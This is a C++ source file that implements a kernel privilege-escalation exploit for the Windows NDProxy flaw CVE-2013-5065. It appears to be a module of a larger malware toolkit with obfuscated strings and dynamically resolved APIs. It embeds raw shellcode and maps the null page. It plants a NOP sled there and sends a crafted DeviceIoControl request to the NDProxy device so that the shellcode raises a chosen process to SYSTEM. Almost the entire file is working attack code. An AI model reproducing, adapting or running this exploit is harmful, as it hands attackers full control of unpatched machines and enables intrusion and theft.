#include "core\core.h"
#include "core\service.h"
#include "core\debug.h"

namespace Elevation
{

unsigned char shellcode[267] =
{
    0x60, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x83,
    0xEB, 0x06, 0x8B, 0x4D, 0x00, 0x8B, 0x49, 0x04,
    0x81, 0xE1, 0x00, 0xF0, 0xFF, 0xFF, 0x66, 0x81,
    0x39, 0x4D, 0x5A, 0x0F, 0x84, 0x93, 0x00, 0x00,
    0x00, 0x81, 0xE9, 0x00, 0x10, 0x00, 0x00, 0xEB,
    0xED, 0x52, 0x50, 0x31, 0xD2, 0x31, 0xC0, 0x80,
    0xF9, 0x01, 0x75, 0x04, 0x66, 0xAD, 0xEB, 0x01,
    0xAC, 0x3C, 0x00, 0x74, 0x0D, 0x3C, 0x61, 0x72,
    0x02, 0x2C, 0x20, 0xC1, 0xCA, 0x0D, 0x01, 0xC2,
    0xEB, 0xE3, 0x39, 0xDA, 0x58, 0x5A, 0xC3, 0x56,
    0x89, 0xDA, 0xB2, 0x3C, 0x31, 0xC0, 0x66, 0x8B,
    0x02, 0x01, 0xD8, 0x8B, 0x50, 0x78, 0x01, 0xDA,
    0x52, 0x51, 0x8B, 0x4A, 0x18, 0x8B, 0x42, 0x20,
    0x01, 0xD8, 0x8B, 0x38, 0x01, 0xDF, 0x53, 0x8B,
    0x1E, 0x87, 0xF7, 0x51, 0x31, 0xC9, 0xE8, 0xAE,
    0xFF, 0xFF, 0xFF, 0x59, 0x5B, 0x87, 0xF7, 0x75,
    0x02, 0xEB, 0x08, 0x83, 0xC0, 0x04, 0x49, 0xE3,
    0x22, 0xEB, 0xDF, 0x8B, 0x42, 0x18, 0x29, 0xC8,
    0x89, 0xC1, 0x8B, 0x42, 0x24, 0x01, 0xD8, 0x66,
    0x8B, 0x0C, 0x48, 0x8B, 0x42, 0x1C, 0x01, 0xD8,
    0xC1, 0xE1, 0x02, 0x01, 0xC8, 0x8B, 0x00, 0x01,
    0xD8, 0x89, 0x06, 0x59, 0x5A, 0x83, 0xC6, 0x04,
    0xE2, 0xAE, 0x5E, 0xC3, 0x89, 0xDD, 0x89, 0xCB,
    0x31, 0xC9, 0x41, 0x68, 0x74, 0xC9, 0xAC, 0x4A,
    0x89, 0xE6, 0xE8, 0x88, 0xFF, 0xFF, 0xFF, 0x6A,
    0x00, 0x89, 0xE7, 0x57, 0x8B, 0x85, 0x0B, 0x01,
    0x00, 0x00, 0x50, 0xFF, 0x16, 0x5F, 0x83, 0xF8,
    0x00, 0x75, 0x26, 0x6A, 0x00, 0x89, 0xE0, 0x50,
    0x6A, 0x04, 0xFF, 0x16, 0x5E, 0x83, 0xF8, 0x00,
    0x75, 0x17, 0x81, 0xC6, 0xC8, 0x00, 0x00, 0x00,
    0x81, 0xC7, 0xC8, 0x00, 0x00, 0x00, 0x8B, 0x06,
    0x89, 0x07, 0xC7, 0x47, 0x6C, 0x00, 0x00, 0x00,
    0x00, 0x58, 0x61, 0xB8, 0x01, 0x01, 0x00, 0x00,
    0xC2, 0x04, 0x00 
};
 
 
typedef NTSTATUS (WINAPI *PNTALLOCATE)( IN HANDLE ProcessHandle,
          IN OUT PVOID *BaseAddress,
          IN ULONG ZeroBits,
          IN OUT PULONG RegionSize,
          IN ULONG AllocationType,
          IN ULONG Protect 
);
 
LPVOID hexcode_addr = (LPVOID)0x00000001;
DWORD region_size = 0x2000;
 
bool NDProxy( DWORD pid )
{
	Service::Start( _CS_("RemoteAccess") );
	PNTALLOCATE ZwAllocateVirtualMemory;
	NTSTATUS alloc_status;
	DbgMsg( "[+] CVE-2013-5065 Exploit by secniu" );
	DbgMsg( "[+] ZwAllocateVirtualMemory" );
	HMODULE ntdll = API(KERNEL32, GetModuleHandleA)( _CS_("ntdll.dll") );
	ZwAllocateVirtualMemory = (PNTALLOCATE)API(KERNEL32, GetProcAddress)( ntdll, _CS_("ZwAllocateVirtualMemory") );
 
	if( !ZwAllocateVirtualMemory )
	{
		DbgMsg( _CS_("[!!] Unable to resolve ZwAllocateVirtualMemory") );
		return false;
	}
	DbgMsg( "\t\t\t [0x%p ]", ZwAllocateVirtualMemory );
	DbgMsg( "[+] Allocating memory at [0x%p]...", hexcode_addr );
 
	alloc_status = ZwAllocateVirtualMemory(
		INVALID_HANDLE_VALUE, //ProcessHandle
		&hexcode_addr, // BaseAddress.
		0, //ZeroBits
		&region_size,//ecx, //RegionSize
		0x103000, //AllocationType
		0x40 //Protect
		);
	DbgMsg( "[+] status %p.", alloc_status );
 
	if( alloc_status != 0 )
	{
		DbgMsg( "[-] Sh*t happen with ZwAllocateVirtualMemory() , %#X\n", alloc_status );
	}
	DbgMsg( "\t\tZwAllocateVirtualMemory() Allocated return Status, %#X\n", alloc_status );
	Mem::Set( hexcode_addr, 0x90, 0x0ef5 );
	Mem::Copy( (BYTE*)hexcode_addr + 0x0ef5, shellcode, 0x10b );
 
	if( pid == 0 ) pid = Process::CurrentPID();
	if (pid > 0)
	{
		DbgMsg( "[+] PID is %d", pid );
	}
	else
	{
		DbgMsg( "[-] PID error, code: %d\n", API(KERNEL32, GetLastError)() );
	}
	Mem::Copy( (BYTE*)hexcode_addr + 0x0ef5 + 0x10b, &pid, 4 );
 
	HANDLE deviceHandle = API(KERNEL32, CreateFileA)( _CS_("\\\\.\\NDProxy"), 0, 0, NULL, 3, 0, NULL );
 
	if( deviceHandle == INVALID_HANDLE_VALUE )
	{
		//error code 2 ERROR_FILE_NOT_FOUND
		DbgMsg( "[-] Open NDProxy device failed, code: %d", API(KERNEL32, GetLastError)() );
		return 0;
	}
	else
	{
		DbgMsg( "[+] Open NDProxy device success" );
	}
 
	DWORD* heap_buffer = (DWORD*)API(KERNEL32, VirtualAlloc)( 0, 0x400, 0x1000, 4 );
 
	heap_buffer[5] = 0x7030125;
	heap_buffer[7] = 0xad;
 
	ULONG retSize;
 
	if( !API(KERNEL32, DeviceIoControl)(
		deviceHandle, //hDevice
		0x8fff23c8, //dwIoControlCode
		(LPVOID)heap_buffer,//lpInBuffer
		0x400, // nInBufferSize
		(LPVOID)heap_buffer,//lpOutBuffer
		0x80,//nOutBufferSize
		&retSize,//lpBytesReturned,
		NULL //lpOverlapped
		) // it will create a IRP
	)
	{
		DbgMsg( "[-] DeviceIoControl failed, code: %d", API(KERNEL32, GetLastError)() );
	}
	DbgMsg( "[+] OK!!!" );
	API(KERNEL32, CloseHandle)(deviceHandle);
	return true;
}

}